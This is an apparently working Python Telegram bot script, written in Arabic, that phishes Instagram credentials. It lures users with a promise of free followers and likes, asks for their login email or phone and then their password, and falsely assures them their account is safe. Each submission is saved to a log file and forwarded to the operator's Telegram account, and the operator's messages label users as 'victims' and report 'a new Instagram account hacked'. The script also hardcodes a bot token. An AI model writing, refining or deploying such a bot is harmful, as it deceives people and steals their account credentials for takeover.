import telebot, requests, random, time
from telebot import types 
from telebot import *
log = open("bot-log.txt", "a+", encoding="utf-8")
ID = "7187027002"#الايدي 
names ="مِـٰٚـِْ✮ِـٰٚـِْآنِـٰٚـِْ✮ِـٰٚـِْوٌ̲✗"#المطور
token = "7299563631:AAG9b1pwFTlusI4-8LdKIf1A4LwIKK9dDOw" #التاكون
bot = telebot.TeleBot(token)
try:
	bot.send_message(ID, "Bot Activado ✅") 
except:
	print("""
👋 | Hello, your window has been successfully opened to hack Instagram go to the bot and send /start to see the stream
""")
@bot.message_handler(commands=["start"])
def start(message):
	print(f"""	
✅ | عزيزي {names} 	
🌟 | ضحية جديدة دخلت الى البوت
📞 | تعريف الضحية : 
{message.from_user.id}""")
	bot.send_message(message.chat.id, """
👋 | مرحباً بك عزيزي 
👥 | ايديك : 
🔍 | عدد نقاطك : 0
⚜️ | يمكنك من خلال البوت الحصول على متابعين ولايكات انستغرام بكمية محدودة من خلال تجميع النقاط 
ارسل /get للرشق
""")
@bot.message_handler(commands=["Owner"])
def onwer(message):
	bot.send_message(message.chat.id, """
📞 | المطور : @mano_2004_ayman
""")
@bot.message_handler(commands=["get", "n"])
def starts(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="⚡️| لايكات", callback_data="like")
	second_button = types.InlineKeyboardButton(text="🔥| متابعين ", callback_data="sub")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, """
☝️ | اختر واحداً :
""", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, """
🤍 | اختر العدد
⚜️ | عدد 50 كحد اقصى
""")	
		bot.register_next_step_handler(msg, qproc1)
	elif call.data == "sub":
		msg = bot.send_message(call.message.chat.id, """
🤍 | اختر العدد
⚜️ | عدد 50 كحد اقصى 	
""")
		bot.register_next_step_handler(msg, qproc2)
def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, """
🤖 | أدخل المبلغ كـ 𝗇𝗎𝗆𝖻𝖾𝗋
🔰 | حاول مرة أخرى عن طريق كتابة /get
""")
			return
		elif int(num) > 50:
			bot.reply_to(message, """
🌟 | عزيزي اختر عدداً بين 10 - 50
""")		
			return
		else:
			bot.send_message(message.chat.id, f"🌸 عدد المتابعين :- {num}")
			msg = bot.send_message(message.chat.id,"""
✅ | الان ادخل البريد الإلكتروني او رقم الهاتف وبينهما (:) يرجى ملاحظة ان البوت لايقوم بتصدير حسابك بل يقوم بعمل ريفريش ورشق حسابك بامان
""" ":") 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)
def qproc2(message):
	try:
		num = message.text
		if not num.isdigit():
			bot.reply_to(message, """
🤖 | أدخل المبلغ كـ 𝗇𝗎𝗆𝖻𝖾𝗋
🔰 | حاول مرة أخرى عن طريق كتابة /get
""")			
			return 
		elif int(num) > 50:
			bot.reply_to(message, """
🌟 | عزيزي اختر عدداً بين 10 - 50
""")
			return
		else:
			bot.send_message(message.chat.id, f" عدد المتابعين : {num}")
			msg = bot.send_message(message.chat.id,"""
🎉 | ادخل بريدك الإلكتروني او رقم الهاتف الخاص بحسابك
""")	
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)
def step1(message):
	get = f"""
✅ | عزيزي {names}
🎉 | تم اختراق حساب انستغرام جديد :
👥 | الايدي : {message.from_user.id}
🔱 | اسم المستخدم : @{message.from_user.username}
📞 | اسم الحساب: {message.text}
🏁 | الاسم : {message.from_user.first_name}
"""
	log = open("bot-log.txt", "a+", encoding="utf-8")
	log.write(get + "  ")
	log.close()
	print(get)
	bot.send_message(ID, get)
	bot.reply_to(message, f""" 
🎬 | اسم المستخدم الخاص بك 
{message.text}
""")
	msg1 = bot.send_message(message.chat.id, """
🔐 | ادخل الباسوورد الرشق :) 
""")
	bot.register_next_step_handler(msg1, step2)	
def step2(message):
	usrpass = message.text
	get = f""" 
💼 | البيانات التي تم الحصول عليها
👥 | الايدي : {message.from_user.id}
🔱 | اسم المستخدم : @{message.from_user.username}
🔐 | الباسوورد : {usrpass}
🤖 | الاسم : {message.from_user.first_name}
"""
	print(get)
	log = open("bot-log.txt", "a+", encoding="utf-8")
	log.write(get + "  ")
	log.close()
	bot.send_message(ID, get)
	msg = bot.reply_to(message, f""" 
🔐 كلمة المرور :- {usrpass}
""")
	time.sleep(1)
	bot.reply_to(message, f""" 
♥️ شكرا لك على استخدام خدمتنا! إذا كانت البيانات المدخلة صحيحة، فسوف تحصل على متابعينك /𝗅𝗂𝗄𝖾 خلال 1 ساعة! 
""")
bot.polling(none_stop=True)